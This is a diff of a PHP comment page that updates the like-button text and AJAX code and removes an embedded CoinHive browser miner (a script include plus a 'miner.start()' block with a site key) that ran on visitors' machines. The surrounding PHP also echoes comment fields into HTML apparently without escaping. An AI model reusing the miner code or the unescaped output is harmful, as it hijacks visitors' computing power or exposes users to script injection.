@@ -52,7 +52,7 @@
       echo '<p>' . $text . '</p>  -' . $author . ' @ ' . $creation . '<br><br>';
       //Print the buttons
       echo '<button id="like' . $id . '" type="button" class="btn btn-default btn-sm" onclick="likeC(\'like' . $id . '\','. $points .')">
-              <span class="glyphicon glyphicon-thumbs-up"></span> Like ' . $points . '
+              <span class="glyphicon glyphicon-thumbs-up"></span>' . $points . ' Likes
             </button><button class="commentButton" onclick="unhide(this,\'childComment' . $id . '\')">Reply</button>';
       //if not already flagged, give option to flagged
       if($text != 'REMOVED') {
@@ -82,12 +82,10 @@
 <html lang="en">
   <head>
     <link rel="stylesheet" href="../css/pages.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
     <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/pages.css">
     <script type="text/javascript">
       //Vote Button
       $('.vote').click(function () {
@@ -107,30 +105,24 @@
             }
       }}
       </script>
-      <script id="source" language="javascript" type="text/javascript">
+      <script language="javascript" type="text/javascript">
          function likeC(id, points){
            //Send reuest to php page for information
            $.ajax({
                  type: "GET",
-                 url: 'utilities/upvote.php?',
+                 url: 'utilities/upvote.php',
                  dataType: "json",
                  data: {comment: id, points: points},
-                 success: function(){
+                 success: function(data){
                    var div = document.getElementById(id);
-                   div.innerHTML = '<span class="glyphicon glyphicon-thumbs-up"></span> Like  ' + (points + 1);
+                   div.innerHTML = '<span class="glyphicon glyphicon-thumbs-up"></span> ' + (points + 1) + ' Likes';
                  },
                  error: function() {
-                   alert("Error.");
+                   alert("There was an error with voting. Please try again later.");
                  }
              });
            };
        </script>
-      <script>
-      //Start miner
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
-
-    </script>
     <!-- End questionable content -->
 
     <!-- The top banner of the webpage -->
